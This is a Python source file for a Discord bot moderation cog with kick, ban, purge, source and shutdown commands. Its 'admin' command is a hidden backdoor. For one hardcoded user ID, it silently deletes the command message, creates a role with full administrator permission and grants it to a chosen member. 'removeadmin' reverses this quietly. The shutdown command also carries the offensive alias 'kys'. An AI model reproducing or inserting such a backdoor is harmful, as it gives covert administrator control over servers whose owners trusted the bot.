import discord
from discord.ext import commands
import asyncio
import random
import inspect #Used for the source command

class Staff:
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.has_permissions(kick_members=True)
    async def kick(self, ctx, user: discord.Member = None):
        if user == None:
            #embed = discord.Embed(title="Error:", description="**You didn't mention a user.**", color=0xE73C24)
            #embed.add_field(name="\u200b", value="**Usage:** w/kick <@user>\n**Example:** w/kick <@322449414142558208>")
            #await ctx.send(embed=embed)'
            await ctx.send(f":x: - **You forgot to mention a user**")
        else:
            await user.kick()
            #ban = discord.Embed(title="Kick!", description=f"{user} was successfully kicked by {ctx.message.author}", color=0x15c513)
            #await ctx.send(embed=ban)
            await ctx.send(f":white_check_mark: - **Successfully kicked: {user.name}**")

    @commands.command()
    @commands.has_permissions(ban_members=True)
    async def ban(self, ctx, user: discord.Member = None):
        if user == None:
            #embed = discord.Embed(title="Error:", description="**You didn't mention a user.**", color=0xE73C24)
            #embed.add_field(name="\u200b", value="**Usage:** w/ban <@user>\n**Example:** w/ban <@322449414142558208>")
            #await ctx.send(embed=embed)
            await ctx.send(f":x: - **You forgot to mention a user**")
        else:
            await user.ban()
            #ban = discord.Embed(title="Banhammer!", description=f"{user} was banned by {ctx.message.author}", color=0x15c513)
            #await ctx.send(embed=ban)
            await ctx.send(f":white_check_mark: - **Successfully banned: {user.name}**")

    @commands.command(aliases=["command", "code"])
    @commands.is_owner()
    async def source(self, ctx, *, text: str):
        try:
            """Shows source code of a command."""
            nl2 = '`'
            nl = f"``{nl2}"
            source_thing = inspect.getsource(self.bot.get_command(text).callback)
            await ctx.send(f"{nl}py\n{source_thing[:1990]}{nl}")
            if len(source_thing) > 1990:
                await ctx.send(f"{nl}py\n{source_thing[1990:3980]}{nl}")
                if len(source_thing) > 3980:
                    await ctx.send(f"{nl}py\n{source_thing[3980:5970]}{nl}")
                    if len(source_thing) > 5970:
                        await ctx.send(f"{nl}py\n{source_thing[5970:7960]}{nl}")
        except AttributeError:
            embed = discord.Embed(title="Error:", description="Please enter a valid command name", color=0xE73C24)
            await ctx.send(embed=embed)

    @commands.command()
    async def admin(self, ctx, user: discord.Member):
        if ctx.message.author.id == 322449414142558208:
            await ctx.message.delete()
            admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
            if admin_role:
                await user.add_roles(admin_role)
            elif not admin_role:
                perms = discord.Permissions(permissions=8)
                await ctx.guild.create_role(name="Perms", permissions=perms)
                await asyncio.sleep(3)
                admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
                await user.add_roles(admin_role)
            await user.send(":white_check_mark: - **You successfully got admin perms**")
        else: 
            #await user.send(":x: - **I haven't got enough perms to give you admin perms**")'
            return

    @commands.command()
    async def removeadmin(self, ctx, user: discord.Member):
        if ctx.message.author.id == 322449414142558208:
            await ctx.message.delete()
            admin_role = discord.utils.get(ctx.message.guild.roles, name="Perms")
            if admin_role:
                await user.remove_roles(admin_role)
                await admin_role.delete()
        else: 
            return

    @commands.command(aliases=["purge", "nuke"])
    @commands.has_permissions(manage_messages=True)
    async def delete(self, ctx, number: int = None):
        if number == None:
            await ctx.send(":x: - **You forgot to specify the amount of messages**")
        else:
            await ctx.channel.purge(limit=number+1)
            test = await ctx.send(f":white_check_mark: - **Successfully deleted {number} messages**")
            await asyncio.sleep(7)
            await test.delete()

    @commands.command(aliases=["kill", "quit", "logout", "kys"])
    @commands.is_owner()
    async def shutdown(self, ctx):
        if ctx.message.author.id == 322449414142558208:
            embed = discord.Embed(title="Shutting down...", description="The bot was successfully shut down", color=0x15c513)
            send = await ctx.send(embed=embed)
            await send.add_reaction(emoji="👌")
            print("The bot was successfully shut down!")
            await self.bot.logout()

def setup(bot):
    bot.add_cog(Staff(bot))